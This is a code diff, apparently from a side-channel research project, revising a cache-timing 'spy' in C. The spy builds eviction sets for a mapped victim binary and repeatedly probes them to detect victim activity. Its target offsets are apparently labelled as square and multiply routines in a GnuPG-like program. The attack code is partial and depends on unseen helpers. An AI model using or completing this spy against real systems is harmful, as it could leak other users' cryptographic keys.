@@ -34,32 +34,23 @@ void *map(char *file_name, uint64_t offset)
 // TODO load addresses from file
 
 void init_spy(char *target_filepath, int offset_target){
-    printf("[+] init spy\n");
+    printf("[+] spy: init spy\n");
     // load victim 
     // victim_reader(target_filepath);
     victim = map(target_filepath, offset_target);
     // printf("victim read\n");
 
     // prepare evset
-    Config *spy_conf= config_init(24, 2048, 64, 125, 2097152, 1, 1);
+    Config *spy_conf= config_init(24, 2048, 64, 115, 2097152, 1, 1);
     init_evset(spy_conf);
     printf("[+] spy: init evset done\n");
     spy_evsets = find_evset(spy_conf, victim);
     printf("[+] spy: find evset done\n");
     
-    printf("[+] spy evset for target adrs %p\n", victim);
+    printf("[+] spy: print spy evset for target adrs %p\n", victim);
     list_print(spy_evsets);
 
     msrmts_spy = malloc(1000000*sizeof(uint64_t));
-}
-
-uint64_t my_detect(void *spy_target){
-    my_access(spy_target+222);   
-
-    uint64_t probe = probe_chase_loop(spy_target, 1);
-    probe_chase_loop(spy_target, conf->evset_size);
-    // traverse_list0(*spy_evsets); // TODO find out threshold
-    return probe;       
 }
 
 static __inline__ unsigned long long rdtsc(void)
@@ -70,9 +61,11 @@ static __inline__ unsigned long long rdtsc(void)
 }
 
 void my_monitor(void *spy_target){
-    int ctr =0;
+    int ctr =0, evset_probetime;
     unsigned long long old_tsc, tsc = rdtsc();
-    traverse_list0(*spy_evsets);
+    probe_evset_chase(*spy_evsets);
+    probe_evset_chase(*spy_evsets);
+
     while(1)
     {
         old_tsc = tsc;
@@ -81,10 +74,10 @@ void my_monitor(void *spy_target){
         {
             tsc = rdtsc();
         }
-        msrmts_spy[ctr]= my_detect(spy_target);
-        
+        msrmts_spy[ctr]= probe_chase_loop(spy_target, 1);
+        evset_probetime = probe_evset_chase(*spy_evsets);
         if(msrmts_spy[ctr] < conf->threshold) {
-            printf("[!] my_monitor victim acitivity detected! cycles %lu, ctr %d\n", msrmts_spy[ctr], ctr);
+            printf("[!] my_monitor: victim acitivity detected! cycles %lu, ctr %d, evset_probetime %lu\n", msrmts_spy[ctr], ctr, evset_probetime);
         }
         ctr++;
         if(ctr >= 1000000) ctr=0;
@@ -96,9 +89,7 @@ void my_monitor(void *spy_target){
 
 void spy(char *victim_filepath, int offset_target){
     init_spy(victim_filepath, offset_target);
-    printf("[+] spy init complete, monitoring %p now...\n", victim);
-    void **test_print = (void **)victim;
-    printf("victim adrs %p\n", *test_print);
+    printf("[+] spy: spy init complete, monitoring %p now...\n", victim);
     my_monitor(victim);
 }
 
@@ -107,11 +98,15 @@ int main(int ac, char **av){
     // printf("%s\n", av[2]); // second file path later, rn hardcoded location 
     // int my_target = 0x15cb;
     if(ac!=3) return 0;
-    int my_target = 0xd57ed; 
-    //0x15a2-0x1a0a victim_loop2, loop itself 0x15be - 0x15e6 alder lake
+    // int my_target = 0xd57ed; 
+    int my_target = 0x15c8;
+    //0x15a2-0x1a0a victim_loop2, loop itself 0x15be - 0x15e6, take 0x15c8 alder lake
     //0xd57ed madgpg sqr, 0xd571f mul
     // my_access(my_target);
     // printf("%d\n", my_target);
     // printf("%p\n", target_loader(av[2]));
     spy(av[1], my_target);
 }
+
+//TODO warum 400 cycles in test, aber 1900 hier bei evset probe
+// evtl target im L2 cache ?? was ist mit L1 timing? was mach ich dann?
